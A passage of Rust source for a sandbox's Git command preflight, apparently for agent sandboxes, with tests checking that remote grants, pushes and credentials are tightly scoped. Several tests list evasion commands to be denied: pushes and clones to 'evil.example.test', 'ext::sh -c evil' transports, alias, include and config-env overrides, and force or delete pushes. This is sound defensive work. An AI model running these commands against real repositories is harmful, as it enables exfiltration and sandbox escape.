                return Ok(());
            };
            preflight.read_remote(url)
        }
        "foreach" => {
            let mut body = operands
                .iter()
                .skip_while(|word| matches!(word.text.as_str(), "-q" | "--quiet" | "--recursive"));
            let first = body.next();
            let script = if first.is_some_and(|word| word.text == "--") {
                body.next()
            } else {
                first
            };
            if let Some(script) = script {
                scan_shell_body(script, preflight, depth)?;
            }
            Ok(())
        }
        _ => Ok(()),
    }
}

/// Accept only known read options; do not guess the arity of an abbreviation,
/// bundle, or unsupported option and then check the wrong argument as remote.
fn read_positionals<'a>(
    words: &'a [Word],
    flags: &[&str],
    value_options: &[&str],
) -> Result<Vec<&'a Word>> {
    let mut result = Vec::new();
    let mut index = 0;
    let mut end_of_options = false;
    while index < words.len() {
        let arg = &words[index];
        let word = arg.text.as_str();
        if arg.dynamic {
            return Err(denied(
                "dynamic arguments cannot be authorized for this Git read",
            ));
        }
        if !end_of_options && word == "--" {
            end_of_options = true;
            index += 1;
            continue;
        }
        if !end_of_options && word.starts_with('-') && word != "-" {
            if flags.contains(&word) {
                index += 1;
            } else if value_options.contains(&word) {
                if words
                    .get(index + 1)
                    .is_none_or(|value| value.dynamic || value.text.starts_with('-'))
                {
                    return Err(denied("Git read option requires a literal value"));
                }
                index += 2;
            } else if word.starts_with("--")
                && word
                    .split_once('=')
                    .is_some_and(|(key, value)| value_options.contains(&key) && !value.is_empty())
            {
                index += 1;
            } else {
                return Err(denied(
                    "unsupported option in manifest Git read; use full supported options",
                ));
            }
            continue;
        }
        result.push(&words[index]);
        index += 1;
    }
    Ok(result)
}

fn authorize_url_or_name(word: &Word, grant: Option<&GitGrantAuthorization>) -> Result<()> {
    let Some(grant) = grant else {
        return Err(no_grant_denial());
    };
    if word.dynamic {
        return Err(denied(
            "dynamic git remote argument cannot be authorized; name a granted remote or URL literally",
        ));
    }
    if grant.remote_by_name(&word.text).is_some() {
        return Ok(());
    }
    let canonical = canonicalize_command_url(&word.text)?;
    if grant
        .remotes
        .iter()
        .any(|remote| remote.canonical == canonical)
    {
        Ok(())
    } else {
        Err(denied("git remote is not in this tenant's host git grant"))
    }
}

fn canonicalize_command_url(raw: &str) -> Result<String> {
    if let Ok(parsed) = parse_remote_url(raw) {
        return Ok(parsed.canonical);
    }
    // A bare absolute /workspace path is the in-container spelling of a
    // granted `file:///workspace/...` remote.
    let relative = raw
        .strip_prefix("/workspace/")
        .ok_or_else(|| denied("git remote must be a granted name or an absolute URL"))?;
    validate_virtual_relative_path(relative).map_err(denied)?;
    Ok(format!("file:///workspace/{relative}"))
}

fn no_grant_denial() -> SandboxError {
    denied(
        "no host git grant applies to this call; request extensions=[\"git-remotes\"] and \
         have the tenant operator configure SANDBOX_GIT_REMOTES",
    )
}

#[cfg(test)]
mod tests {
    use super::*;

    fn spec() -> GitGrantConfig {
        GitGrantConfig::from_spec(
            "origin=file:///workspace/remotes/origin.git,\
             upstream=https://Git.Example.test/org/repo.git,\
             legacy=http://git.internal/org/repo.git",
        )
        .unwrap()
        .unwrap()
    }

    fn workspace_with_remote() -> (tempfile::TempDir, GitGrantAuthorization) {
        let temp = tempfile::tempdir().unwrap();
        let remote = temp.path().join("remotes/origin.git");
        std::fs::create_dir_all(&remote).unwrap();
        let cwd = temp.path().canonicalize().unwrap();
        let host = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
            .unwrap()
            .unwrap();
        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        (temp, grant)
    }

    #[test]
    fn config_accepts_named_remotes_and_rejects_embedded_credentials() {
        let parsed = spec();
        assert_eq!(parsed.remotes.len(), 3);
        assert_eq!(parsed.remotes[0].name, "origin");
        assert_eq!(parsed.remotes[1].host.as_deref(), Some("git.example.test"));
        assert_eq!(parsed.remotes[2].transport, GitTransport::Http);
        for bad in [
            "origin=https://user:token@git.example.test/repo.git",
            "origin=git@git.example.test:org/repo.git",
            "origin=https://git.example.test/repo.git?token=1",
            "origin=/srv/git/repo.git",
            "origin=file:///srv/git/repo.git",
            "origin=file:///workspace/../etc/repo.git",
            "Origin=https://git.example.test/repo.git",
            "origin=https://git.example.test/repo.git,origin=https://git.example.test/other.git",
            "origin=https://git.example.test/repo.git,upstream",
            "origin=ftp://git.example.test/repo.git",
            "origin=https://*.example.test/repo.git",
            "origin=https://git.example.test:invalid/repo.git",
        ] {
            assert!(GitGrantConfig::from_spec(bad).is_err(), "accepted {bad}");
        }
        assert!(GitGrantConfig::from_spec("  ").unwrap().is_none());
    }

    #[test]
    fn invalid_configuration_never_echoes_supplied_values() {
        const MARKER: &str = "redaction-marker";
        for input in [
            MARKER.to_owned(),
            format!("{MARKER}="),
            format!("origin=https://{MARKER}@git.example.test/repo.git"),
            format!("origin=https://git.example.test/repo.git?label={MARKER}"),
            format!("origin=https://git.example.test/repo.git#{MARKER}"),
            format!("origin={MARKER}"),
            format!("origin={MARKER}://git.example.test/repo.git"),
            format!("origin=file:///workspace/{MARKER}/../repo.git"),
        ] {
            let error = GitGrantConfig::from_spec(&input).unwrap_err();
            assert!(error.contains("SANDBOX_GIT_REMOTES"));
            assert!(
                !error.contains(MARKER),
                "configuration error disclosed input"
            );
        }
    }

    #[test]
    fn network_remotes_require_the_validating_proxy_and_fail_closed_elsewhere() {
        let network_only =
            GitGrantConfig::from_spec("upstream=https://git.example.test/org/repo.git")
                .unwrap()
                .unwrap();
        for mode in [
            SandboxNetworkMode::None,
            SandboxNetworkMode::Tunnel,
            SandboxNetworkMode::Proxy,
        ] {
            let error = authorize_grant(&network_only, &[], Path::new("/tmp"), mode).unwrap_err();
            assert!(error.to_string().contains("git-remotes"), "{error}");
        }
        let grant = authorize_grant(
            &network_only,
            &[],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap();
        assert_eq!(grant.egress, [SandboxNetworkMode::ProxyEnforced]);
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let file_only = GitGrantConfig::from_spec("origin=file:///workspace/remotes/origin.git")
            .unwrap()
            .unwrap();
        for mode in [
            SandboxNetworkMode::None,
            SandboxNetworkMode::Tunnel,
            SandboxNetworkMode::ProxyEnforced,
        ] {
            let grant = authorize_grant(&file_only, &[], &cwd, mode).unwrap();
            assert!(!grant.egress.contains(&SandboxNetworkMode::Proxy));
        }
        assert!(authorize_grant(&file_only, &[], &cwd, SandboxNetworkMode::Proxy).is_err());
    }

    #[test]
    fn requests_can_narrow_but_never_broaden_the_host_grant() {
        let host = spec();
        let grant = authorize_grant(
            &host,
            &["upstream".to_string()],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap();
        assert_eq!(grant.remotes.len(), 1);
        assert_eq!(grant.remotes[0].name, "upstream");
        assert_eq!(
            grant
                .proxy_hosts(&["*.example.test".into(), "git.internal".into()])
                .unwrap(),
            ["git.example.test"]
        );
        assert!(matches!(
            grant.proxy_hosts(&["git.internal".into()]),
            Err(SandboxError::CapabilityDenied { .. })
        ));
        let error = authorize_grant(
            &host,
            &["other-tenant".to_string()],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap_err();
        assert!(matches!(error, SandboxError::CapabilityDenied { .. }));
        assert!(error.to_string().contains("other-tenant"));
    }

    #[test]
    fn file_remotes_must_stay_inside_the_call_workspace() {
        let temp = tempfile::tempdir().unwrap();
        let outside = tempfile::tempdir().unwrap();
        #[cfg(unix)]
        std::os::unix::fs::symlink(outside.path(), temp.path().join("escape")).unwrap();
        let cwd = temp.path().canonicalize().unwrap();
        for name in ["escape", "missing"] {
            let host = GitGrantConfig::from_spec(&format!("origin=file:///workspace/{name}"))
                .unwrap()
                .unwrap();
            let error =
                authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap_err();
            assert!(matches!(error, SandboxError::CapabilityDenied { .. }));
        }
    }

    #[test]
    fn container_env_has_remote_urls_and_hardening_but_no_credentials() {
        let (_temp, grant) = workspace_with_remote();
        let env = grant.container_env();
        let map: std::collections::HashMap<_, _> = env.iter().cloned().collect();
        assert_eq!(
            map.get("GIT_TERMINAL_PROMPT").map(String::as_str),
            Some("0")
        );
        assert_eq!(
            map.get("GIT_CONFIG_GLOBAL").map(String::as_str),
            Some("/dev/null")
        );
        assert_eq!(
            map.get("GIT_CONFIG_KEY_0").map(String::as_str),
            Some("remote.origin.url")
        );
        // The empty value clears the URL list before the granted URL is
        // added, so a repository-local URL cannot outrank the host pin.
        assert_eq!(map.get("GIT_CONFIG_VALUE_0").map(String::as_str), Some(""));
        assert_eq!(
            map.get("GIT_CONFIG_KEY_1").map(String::as_str),
            Some("remote.origin.url")
        );
        assert_eq!(
            map.get("GIT_CONFIG_VALUE_1").map(String::as_str),
            Some("file:///workspace/remotes/origin.git")
        );
        assert_eq!(
            map.get("GIT_CONFIG_KEY_2").map(String::as_str),
            Some("credential.helper")
        );
        assert_eq!(map.get("GIT_CONFIG_VALUE_2").map(String::as_str), Some(""));
        let joined = env
            .iter()
            .map(|(key, value)| format!("{key}={value}"))
            .collect::<Vec<_>>()
            .join("\n");
        for needle in ["token", "password", "PRIVATE KEY", "helper="] {
            assert!(
                !joined
                    .to_ascii_lowercase()
                    .contains(&needle.to_ascii_lowercase()),
                "{joined}"
            );
        }
    }

    #[test]
    fn evidence_records_grant_host_and_operations_without_secrets() {
        let (_temp, grant) = workspace_with_remote();
        let evidence = grant.evidence();
        assert_eq!(evidence.grant, GIT_GRANT_ID);
        assert_eq!(evidence.remotes.len(), 1);
        assert_eq!(evidence.remotes[0].name, "origin");
        assert_eq!(evidence.remotes[0].transport, GitTransport::File);
        assert_eq!(
            evidence.remotes[0].operations,
            vec![GitOperationClass::Read]
        );
        let json = serde_json::to_string(&evidence).unwrap();
        assert!(json.contains("\"grant\":\"host:sandbox-git-remotes\""));
        assert!(!json.contains("token"));
        assert!(!json.contains("secret"));
    }

    #[test]
    fn offline_manifest_allows_ordinary_local_reads_without_a_grant() {
        for command in [
            "git clone https://git.example.test/org/repo.git",
            "git push origin main",
            "git -C repo fetch upstream",
            "git ls-remote https://git.example.test/org/repo.git",
            "git remote add origin https://git.example.test/org/repo.git",
            "sh -c 'git pull origin main'",
            "env git fetch origin",
        ] {
            let error =
                authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        for command in [
            "git status",
            "git log --oneline -5",
            "git commit -m 'message'",
            "git config --get remote.origin.url",
            "git clone . copy",
            "git clone -q ./repo copy",
            "git fetch",
            "git pull --ff-only",
            "cargo build",
            "echo git clone nope",
        ] {
            authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap();
        }
        for command in ["git clone . copy", "git fetch", "git pull --ff-only"] {
            assert!(matches!(
                authorize_shell_command(command, None, SandboxNetworkMode::ProxyEnforced),
                Err(SandboxError::CapabilityDenied { .. })
            ));
        }
    }

    fn check_granted(command: &str, grant: &GitGrantAuthorization) -> Result<()> {
        authorize_shell_command(command, Some(grant), SandboxNetworkMode::ProxyEnforced)
    }

    #[test]
    fn granted_remote_name_and_exact_url_are_accepted_but_others_are_denied() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git clone file:///workspace/remotes/origin.git",
            "git clone /workspace/remotes/origin.git work",
            "git fetch origin",
            "git pull origin main",
            "git ls-remote origin",
            "git remote add backup file:///workspace/remotes/origin.git",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| {
                panic!("{command}: {error}");
            });
        }
        for command in [
            "git clone https://evil.example.test/repo.git",
            "git clone file:///workspace/remotes/other.git",
            "git fetch upstream",
            "git push https://evil.example.test/repo.git main",
            "git push $REMOTE main",
            "git fetch --all",
            "git fetch",
            "git remote update",
            "git clone ext::sh -c evil",
            "git -c remote.origin.url=https://evil.example.test/r.git push origin main",
            "git --config-env=remote.origin.url=EVIL push origin main",
            "git -c url.https://evil.example.test/.insteadOf=https://git.example.test/ fetch origin",
            "git -c credential.helper=store push origin main",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    #[test]
    fn clone_options_cannot_hide_the_literal_source_from_preflight() {
        let (_temp, grant) = workspace_with_remote();
        for option in ["-c", "--config", "--conf"] {
            let args = tokenize_simple_commands(&format!("{option} user.name=fixture")).unwrap();
            let error = authorize_clone(
                &args[0],
                Preflight {
                    grant: Some(&grant),
                    offline: false,
                },
            )
            .unwrap_err();
            assert!(error.to_string().contains("unsupported option"), "{error}");
        }
        check_granted(
            "git clone --depth=1 -- /workspace/remotes/origin.git copy",
            &grant,
        )
        .unwrap();
    }

    #[test]
    fn remote_options_cannot_shift_the_checked_url() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git remote add -t main origin https://evil.example.test/repo.git",
            "git remote set-url --push origin https://evil.example.test/repo.git",
            "git remote set-url origin https://evil.example.test/repo.git",
            "git remote add -m main origin ext::sh -c evil",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        for command in [
            "git remote add -t main backup file:///workspace/remotes/origin.git",
            "git remote set-url --push origin /workspace/remotes/origin.git",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| {
                panic!("{command}: {error}");
            });
        }
    }

    #[test]
    fn alias_include_and_config_env_routes_are_denied_before_git_reevaluates_them() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git -c alias.x=push x origin HEAD:refs/heads/main",
            "git -c 'alias.x=push --force' x origin HEAD:refs/heads/main",
            "git -c alias.f=fetch f ../other.git",
            "git --config=alias.p=push p origin main",
            "git --config-env=alias.p=PUSH_VAR p origin main",
            "git -C repo -c alias.p=push p origin main",
            "git -c include.path=/tmp/evil.gitconfig p",
            "git -c includeIf.gitdir:repo/.path=/tmp/evil.gitconfig p",
            "git config alias.p push",
            "git config --add alias.p push",
            "git config --global alias.p 'push --force'",
            "git config --file /tmp/cfg alias.p push",
            "git config --unset remote.origin.url",
            "git config --remove-section alias",
            "git config --rename-section alias.p alias.q",
            "git config user.name fixture; git config alias.p push",
            "GIT_CONFIG_KEY_0=alias.p GIT_CONFIG_VALUE_0=push git p",
            "env GIT_CONFIG_PARAMETERS=\"'alias.p=push'\" git p",
            "export GIT_CONFIG_COUNT=1",
            "bash -lc 'git config alias.p push'",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        for command in [
            "git config --get remote.origin.url",
            "git config --get alias.p",
            "git config --list --local",
            "git config -lz",
            "git config --type=int --get core.repositoryformatversion",
            "git config --type=int --get core.repositoryformatversion --local",
            "git config -f /workspace/repo/.git/config --get user.name",
            "git config user.name fixture",
            "git config --type bool --get core.bare",
            "git config --get-urlmatch remote.origin.url https://git.example.test",
            "FOO=1 git status",
            "git -c user.name=fixture commit -m message",
            "git commit -m message",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| {
                panic!("{command}: {error}");
            });
        }
    }

    #[test]
    fn preflight_refuses_push_before_git_can_interpret_flags_or_defaults() {
        let (_temp, grant) = workspace_with_remote();
        // A read-only grant refuses push entirely, with the write-grant
        // remedy named in the denial.
        for command in [
            "git push",
            "git push origin main",
            "git push --repo origin",
            "git push --force origin main",
            "git push -f origin main",
            "git push -qf origin main",
            "git push origin +main",
            "git push --force-with-lease origin main",
            "git push --force-with-lease=main origin main",
            "git push --mirror origin",
            "git push --mirr origin",
            "git push --delete origin old-branch",
            "git push --del origin old-branch",
            "git push origin :old-branch",
            "git push --prune origin",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
            assert!(
                error.to_string().contains("SANDBOX_GIT_WRITE_REMOTES")
                    || error.to_string().contains("force")
                    || error.to_string().contains("deletion"),
                "{command}: {error}"
            );
        }
    }

    /// A write grant on one remote: push to it is allowed, but force push and
    /// ref deletion are refused in every spelling (deletion has no switch).
    #[test]
    fn write_grant_allows_push_and_refuses_every_force_and_deletion_spelling() {
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let host = GitGrantConfig::from_parts(
            "origin=file:///workspace/remotes/origin.git,\
             upstream=file:///workspace/remotes/upstream.git",
            "origin",
        )
        .unwrap()
        .unwrap();
        std::fs::create_dir_all(cwd.join("remotes/upstream.git")).unwrap();
        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        assert!(grant.remote_by_name("origin").unwrap().write);
        assert!(!grant.remote_by_name("upstream").unwrap().write);

        for allowed in [
            "git push origin main",
            "git push origin HEAD:refs/heads/main",
            "git push -q origin main",
            "git push --set-upstream origin main",
        ] {
            check_granted(allowed, &grant).expect(allowed);
        }

        for forced in [
            "git push --force origin main",
            "git push -f origin main",
            "git push -qf origin main",
            "git push origin +main",
            "git push origin +HEAD:refs/heads/main",
            "git push --force-with-lease origin main",
            "git push --force-with-lease=main origin main",
            "git push --force-if-includes origin main",
            "git push --mirror origin",
            "git push --mirr origin",
            "git push --mir origin",
        ] {
            let error = check_granted(forced, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{forced}: {error}"
            );
            assert!(error.to_string().contains("force"), "{forced}: {error}");
        }

        for deleting in [
            "git push --delete origin old-branch",
            "git push --del origin old-branch",
            "git push origin :old-branch",
            "git push origin :refs/heads/old-branch",
            "git push origin :",
            "git push origin +:old-branch",
        ] {
            let error = check_granted(deleting, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{deleting}: {error}"
            );
            assert!(
                error.to_string().contains("deletion"),
                "{deleting}: {error}"
            );
        }

        // The read-only remote in the same grant still refuses push.
        let error = check_granted("git push upstream main", &grant).unwrap_err();
        assert!(error.to_string().contains("read-only"), "{error}");

        // A destination outside the grant is refused, however it is spelled.
        for outside in [
            "git push https://evil.example.test/repo.git main",
            "git push --repo https://evil.example.test/repo.git main",
            "git push --repo=https://evil.example.test/repo.git main",
            "git push --repo origin main",
            "git push /workspace/remotes/other.git main",
        ] {
            let error = check_granted(outside, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{outside}: {error}"
            );
        }
    }

    /// WI#860 (ALM-1): the per-call proxy's transport policy carries each
    /// selected plain-HTTP remote's write class and credential binding, and a
    /// bound credential is scoped to that repository's own endpoints.
    #[test]
    fn transport_policy_carries_write_class_and_scoped_credentials() {
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let host = GitGrantConfig::from_full_spec(
            "origin=http://git.internal/org/repo.git,\
             mirror=http://git.internal:8080/org/mirror.git,\
             upstream=https://git.example.test/org/repo.git",
            "origin",
            "origin=ORIGIN_TOKEN",
        )
        .unwrap()
        .unwrap();
        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        let policy = grant.transport_policy();
        let remotes = policy.remotes();
        // HTTPS remotes stay opaque CONNECT tunnels and are not listed.
        assert_eq!(remotes.len(), 2, "{remotes:?}");
        assert_eq!(remotes[0].host, "git.internal");
        assert_eq!(remotes[0].port, 80);
        assert_eq!(remotes[0].repo_path, "/org/repo.git");
        assert!(remotes[0].write);
        assert_eq!(remotes[0].secret_env.as_deref(), Some("ORIGIN_TOKEN"));
        assert_eq!(remotes[1].port, 8080);
        assert!(!remotes[1].write && remotes[1].secret_env.is_none());
        // The only tunnel the git proxy opens is the https:// remote's own
        // host and port (review F2); a plain-HTTP remote gets none.
        assert!(policy.check_connect("git.example.test", 443).is_ok());
        for (host, port) in [
            ("git.example.test", 8443),
            ("git.internal", 80),
            ("git.internal", 443),
            ("git.internal", 8080),
        ] {
            assert!(policy.check_connect(host, port).is_err(), "{host}:{port}");
        }

        let mappings = grant.proxy_credentials();
        assert_eq!(mappings.len(), 1);
        assert_eq!(
            mappings[0].path_patterns,
            vec![
                "/org/repo.git/info/refs".to_string(),
                "/org/repo.git/git-upload-pack".to_string(),
                "/org/repo.git/git-receive-pack".to_string(),
            ]
        );
        assert!(mappings[0].matches("git.internal", "/org/repo.git/git-upload-pack"));
        assert!(!mappings[0].matches("git.internal", "/org/other.git/git-upload-pack"));
        assert!(!mappings[0].matches("git.internal", "/api/v4/projects"));
        assert!(!mappings[0].matches("git.internal", "/org/repo.git/../other.git/git-upload-pack"));
    }

    #[test]
    fn write_grant_cannot_broaden_the_read_grant() {
        let error =
            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "upstream")
                .unwrap_err();
        assert!(error.contains("upstream"), "{error}");
        let error =
            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "Origin")
                .unwrap_err();
        assert!(error.contains("remote names"), "{error}");
    }

    #[test]
    fn evidence_records_the_write_operation_class() {
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let host =
            GitGrantConfig::from_parts("origin=file:///workspace/remotes/origin.git", "origin")
                .unwrap()
                .unwrap();
        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        let evidence = grant.evidence();
        assert_eq!(
            evidence.remotes[0].operations,
            vec![GitOperationClass::Read, GitOperationClass::Write]
        );
        let json = serde_json::to_string(&evidence).unwrap();
        assert!(
            json.contains("\"operations\":[\"read\",\"write\"]"),
            "{json}"
        );
    }

    /// WI#875: the allowance names granted remotes, is carried on the
    /// authorization, and reaches only the named remote's exact host and port.
    #[test]
    fn private_destination_allowance_is_per_named_remote() {
        let host = GitGrantConfig::from_specs(
            "lan=http://192.168.1.20:3000/org/repo.git,\
             overlay=http://100.64.0.7/org/other.git,\
             public=https://forge.example.test/org/third.git",
            "",
            "",
            "lan",
        )
        .unwrap()
        .unwrap();
        assert!(host.remotes[0].allow_private);
        assert!(!host.remotes[1].allow_private);
        assert!(!host.remotes[2].allow_private);

        let grant = authorize_grant(
            &host,
            &[],
            Path::new("/tmp"),
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap();
        let allowance = grant.private_egress();
        assert!(!allowance.is_empty());
        let json = serde_json::to_string(&grant.evidence()).unwrap();
        assert!(json.contains("\"private_destination\":true"), "{json}");
        // Only the named remote carries the flag.
        assert_eq!(
            json.matches("\"private_destination\":true").count(),
            1,
            "{json}"
        );
        // The overlay remote's own evidence does not claim the allowance.
        let overlay = json.split("\"name\":\"overlay\"").nth(1).unwrap();
        assert!(!overlay.contains("private_destination"), "{json}");

        // Another remote, and another port on the same host, are not allowed.
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let two = GitGrantConfig::from_specs(
            "lan=http://192.168.1.20:3000/org/repo.git,\
             other=http://192.168.1.21:3000/org/other.git",
            "",
            "",
            "lan,other",
        )
        .unwrap()
        .unwrap();
        let narrowed = authorize_grant(
            &two,
            &["other".to_string()],
            &cwd,
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap();
        let narrowed_allowance = narrowed.private_egress();
        assert!(!narrowed_allowance.is_empty());
        let selected =
            GitGrantConfig::from_specs("lan=http://192.168.1.20:3000/org/repo.git", "", "", "lan")
                .unwrap()
                .unwrap();
        let one = authorize_grant(&selected, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        assert!(!one.private_egress().is_empty());
        // A remote without the allowance contributes nothing.
        let plain =
            GitGrantConfig::from_specs("lan=http://192.168.1.20:3000/org/repo.git", "", "", "")
                .unwrap()
                .unwrap();
        let none = authorize_grant(&plain, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        assert!(none.private_egress().is_empty());
    }

    /// WI#875: the allowance can only name a granted network remote.
    #[test]
    fn private_destination_allowance_rejects_unknown_and_file_remotes() {
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        std::fs::create_dir_all(cwd.join("remotes/origin.git")).unwrap();
        let error = GitGrantConfig::from_specs(
            "origin=file:///workspace/remotes/origin.git",
            "",
            "",
            "origin",
        )
        .unwrap_err();
        assert!(error.contains("file://"), "{error}");
        let error = GitGrantConfig::from_specs(
            "origin=http://git.internal/org/repo.git",
            "",
            "",
            "missing",
        )
        .unwrap_err();
        assert!(error.contains("missing"), "{error}");
    }

    #[test]
    fn credential_bindings_are_host_side_and_secret_free_in_evidence() {
        const MARKER: &str = "credential-value-marker";
        let host = GitGrantConfig::from_full_spec(
            "origin=http://git.internal/org/repo.git",
            "origin",
            "origin=GIT_ORIGIN_TOKEN",
        )
        .unwrap()
        .unwrap();
        assert_eq!(host.credentials.len(), 1);
        assert_eq!(host.credentials[0].remote, "origin");
        assert_eq!(host.credentials[0].secret_env, "GIT_ORIGIN_TOKEN");

        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let grant = authorize_grant(&host, &[], &cwd, SandboxNetworkMode::ProxyEnforced).unwrap();
        let mappings = grant.proxy_credentials();
        assert_eq!(mappings.len(), 1);
        assert_eq!(mappings[0].secret_name, "GIT_ORIGIN_TOKEN");
        assert_eq!(mappings[0].host_patterns, vec!["git.internal".to_string()]);

        // The container environment carries the remote URL only.
        let env = grant.container_env();
        let joined = env
            .iter()
            .map(|(key, value)| format!("{key}={value}"))
            .collect::<Vec<_>>()
            .join("\n");
        assert!(!joined.contains(MARKER), "{joined}");
        assert!(!joined.contains("GIT_ORIGIN_TOKEN"), "{joined}");

        let json = serde_json::to_string(&grant.evidence()).unwrap();
        assert!(json.contains("GIT_ORIGIN_TOKEN"), "{json}");
        assert!(!json.contains(MARKER), "{json}");
    }

    #[test]
    fn credential_bindings_reject_https_unbound_remotes_and_bad_names() {
        for (spec, writes, credentials) in [
            // HTTPS travels in an opaque CONNECT tunnel.
            (
                "origin=https://git.example.test/org/repo.git",
                "",
                "origin=GIT_TOKEN",
            ),
            // A remote that is not granted.
            (
                "origin=http://git.internal/org/repo.git",
                "",
                "upstream=GIT_TOKEN",
            ),
            // A file remote has no host to bind.
            (
                "origin=file:///workspace/remotes/origin.git",
                "",
                "origin=GIT_TOKEN",
            ),
            // Not an environment name.
            (
                "origin=http://git.internal/org/repo.git",
                "",
                "origin=not-a-name",
            ),
            // Missing the variable.
            ("origin=http://git.internal/org/repo.git", "", "origin="),
            // Bound twice.
            (
                "origin=http://git.internal/org/repo.git",
                "",
                "origin=GIT_TOKEN,origin=OTHER_TOKEN",
            ),
        ] {
            assert!(
                GitGrantConfig::from_full_spec(spec, writes, credentials).is_err(),
                "accepted {spec} / {credentials}"
            );
        }
    }

    /// A credential binding is applied only to the selected remotes.
    #[test]
    fn credential_bindings_follow_the_requested_remote_subset() {
        let (temp, _) = workspace_with_remote();
        let cwd = temp.path().canonicalize().unwrap();
        let host = GitGrantConfig::from_full_spec(
            "origin=http://git.internal/org/repo.git,\
             upstream=http://git.internal/org/other.git",
            "",
            "origin=ORIGIN_TOKEN,upstream=UPSTREAM_TOKEN",
        )
        .unwrap()
        .unwrap();
        let grant = authorize_grant(
            &host,
            &["upstream".to_string()],
            &cwd,
            SandboxNetworkMode::ProxyEnforced,
        )
        .unwrap();
        assert_eq!(grant.credentials.len(), 1);
        assert_eq!(grant.credentials[0].secret_env, "UPSTREAM_TOKEN");
    }

    #[test]
    fn preflight_refuses_remote_transport_plumbing_verbs() {
        let (_temp, grant) = workspace_with_remote();
        for command in [
            "git send-pack https://evil.example.test/repo.git HEAD:refs/heads/spliced",
            "git send-pack /workspace/remotes/origin.git HEAD:refs/heads/spliced",
            "git send-pack",
            "git fetch-pack https://evil.example.test/repo.git",
            "git fetch-pack /workspace/remotes/origin.git",
            "git http-push https://evil.example.test/repo.git",
            "git http-fetch origin",
            "git remote-https origin https://evil.example.test/repo.git",
            "git remote-ext origin ext::sh -c evil",
            "true && git send-pack https://evil.example.test/repo.git HEAD:refs/heads/x",
            "sh -c 'git send-pack https://evil.example.test/repo.git HEAD:refs/heads/x'",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
            assert!(
                error
                    .to_string()
                    .contains("not supported by manifest Git preflight"),
                "{command}: {error}"
            );
        }
        // The plumbing verbs are refused even with no grant and no network.
        for command in ["git send-pack . HEAD:refs/heads/x", "git fetch-pack ."] {
            let error =
                authorize_shell_command(command, None, SandboxNetworkMode::None).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
        // Invoked by path, the plumbing executables are not `git` subcommands.
        for command in [
            "/usr/lib/git-core/git-send-pack /workspace/remotes/origin.git HEAD:refs/heads/x",
            "/usr/lib/git-core/git-fetch-pack https://evil.example.test/repo.git",
            "/usr/lib/git-core/git-remote-https origin https://evil.example.test/repo.git",
            "env /usr/lib/git-core/git-send-pack https://evil.example.test/repo.git HEAD:x",
        ] {
            let error = check_granted(command, &grant).unwrap_err();
            assert!(
                matches!(error, SandboxError::CapabilityDenied { .. }),
                "{command}: {error}"
            );
        }
    }

    #[test]
    fn command_line_config_cannot_redefine_the_scanned_verb() {
        let (_temp, grant) = workspace_with_remote();
        // Honest commands still run; the refusal is scoped to the overrides
        // that change what the scan is looking at.
        for command in [
            "git -c user.name=fixture status",
            "git -c core.pager=cat log -1",
            "git config --get remote.origin.url",
        ] {
            check_granted(command, &grant).unwrap_or_else(|error| panic!("{command}: {error}"));
        }
        for command in [
            "git -c alias.q=push q https://evil.example.test/repo.git HEAD:refs/heads/x",
